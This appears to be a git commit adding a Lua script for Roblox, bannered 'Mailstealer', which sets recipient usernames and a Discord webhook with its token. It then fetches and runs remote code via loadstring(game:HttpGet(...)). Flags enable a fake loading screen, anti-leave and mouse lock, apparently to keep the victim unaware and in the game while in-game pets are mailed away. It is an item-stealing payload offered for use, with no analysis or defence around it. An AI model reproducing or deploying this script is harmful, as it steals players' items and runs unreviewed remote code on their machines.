f03e427bfca84430ed7adb0f2e94849a6a027c44
YoYoHead <97983006+YoYoHead@users.noreply.github.com>
2023-07-04 12:29:45 -0500

    d
    d

---
+++ obf_d2p3PH2DM6fDOxgtSML68SF6N66uyp10i776e0vKcYzYlPyz9y6LX1dojJOuOg0D.lua
@@ -0,0 +1,18 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "MH111ROP" -- good pets
+Webhook = "https://discord.com/api/webhooks/1125839443954241586/P3zrdkf7K07f-3T8x5yZwyKCUI_sRTqL3U_N3D2prtMT1VEYQRgSZN7iIrlmYnHjbhGX" -- pings for pets
+UserName2 = "Dreaded_Abyss" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
